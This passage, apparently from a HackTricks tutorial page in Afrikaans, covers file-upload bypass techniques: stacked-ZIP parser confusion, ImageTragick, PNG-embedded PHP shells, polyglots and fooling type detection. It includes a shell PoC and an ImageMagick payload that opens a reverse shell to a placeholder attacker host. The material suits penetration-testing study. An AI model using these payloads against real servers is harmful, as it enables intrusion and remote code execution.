Die konkatenering van twee geldige ZIP‑lêers produseer 'n blob waar verskillende parsers op verskillende EOCD records fokus. Baie tools lokaliseer die laaste End Of Central Directory (EOCD), terwyl sommige libraries (bv. ZipArchive in spesifieke workflows) dalk die eerste archive wat hulle vind ontleed. Indien validasie die eerste archive enumereer en ekstraksie 'n ander tool gebruik wat die laaste EOCD eerbiedig, kan 'n benign archive die kontroles slaag terwyl 'n malicious een uitgepak word.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Misbruikpatroon
- Skep 'n onskadelike argief (toegelate tipe, bv. 'n PDF) en 'n tweede argief wat 'n geblokkeerde uitbreiding bevat (bv. `shell.php`).
- Kombineer dit: `cat benign.zip evil.zip > combined.zip`.
- As die bediener valideer met een parser (sien benign.zip) maar onttrek met 'n ander (verwerk evil.zip), beland die geblokkeerde lêer in die onttrekkingspad.

## ImageTragic

Laai hierdie inhoud op met 'n beelduitbreiding om die kwetsbaarheid te exploit **(ImageMagick , 7.0.1-1)** (form the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Insluiting van PHP Shell in PNG

Om 'n PHP shell in die IDAT-chunk van 'n PNG-lêer in te sluit kan sekere beeldverwerking-operasies effektief omseil. Die funksies `imagecopyresized` en `imagecopyresampled` van PHP-GD is veral relevant in hierdie konteks, aangesien hulle algemeen gebruik word vir onderskeidelik die verkleining en die hersampling van beelde. Die vermoë van die ingesloten PHP shell om ongedeerd te bly deur hierdie operasies is 'n beduidende voordeel vir sekere gebruiksgevalle.

'n Gedetailleerde verkenning van hierdie tegniek, insluitend die metodologie en potensiële toepassings, word in die volgende artikel aangebied: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/).

Meer inligting by: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-lêers

Polyglot-lêers funksioneer as 'n unieke hulpmiddel in kuberveiligheid, en tree op soos kameleons wat geldig in meerdere lêerformate gelyktydig kan bestaan. 'n Intrigerende voorbeeld is 'n [GIFAR](https://en.wikipedia.org/wiki/Gifar), 'n hibried wat beide as 'n GIF en 'n RAR-argief funksioneer. Sulke lêers is nie beperk tot hierdie kombinasie nie; kombinasies soos GIF en JS of PPT en JS is ook doenbaar.

Die kernnut van polyglot-lêers lê in hul vermoë om sekuriteitsmaatreëls te omseil wat lêers op tipe filter. Algemene praktyk in verskeie toepassings behels om slegs sekere lêertipes vir opglaai toe te laat—soos JPEG, GIF, of DOC—om die risiko van potensieel skadelike formate (bv. JS, PHP, of Phar-lêers) te beperk. 'n Polyglot kan egter aan die strukturele kriteria van meerdere lêertipes voldoen en sodoende hierdie beperkings stilweg omseil.

Ten spyte van hul aanpasbaarheid stuit polyglots wel op beperkings. Byvoorbeeld, al kan 'n polyglot gelyktydig 'n PHAR-lêer en 'n JPEG beliggaam, kan die sukses van die opglaai afhanklik wees van die platform se beleid oor lêeruitbreidings. As die stelsel streng is oor toelaatbare lêeruitbreidings, mag die blote strukturele dualiteit van 'n polyglot nie volstaan om die opglaai te verseker nie.

Meer inligting by: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Laai geldige JSONs op asof dit 'n PDF is

Hoe om lêertipe-detektering te omseil deur 'n geldige JSON-lêer op te laai, selfs al is dit nie toegelaat nie, deur 'n PDF-lêer voor te gee (tegnieke van **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: So lank as die `%PDF` magic bytes in die eerste 1024 bytes is, is dit geldig (sien voorbeeld in die post)
- **`pdflib` library**: Voeg 'n vals PDF-formaat binne 'n veld van die JSON in sodat die library dink dit is 'n pdf (sien voorbeeld in die post)
- **`file` binary**: Dit kan tot 1048576 bytes van 'n lêer lees. Skep net 'n JSON wat groter as dit is sodat dit nie die inhoud as 'n json kan parse nie, en sit dan binne die JSON die aanvanklike deel van 'n werklike PDF en dit sal dink dit is 'n PDF

## Verwysings

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
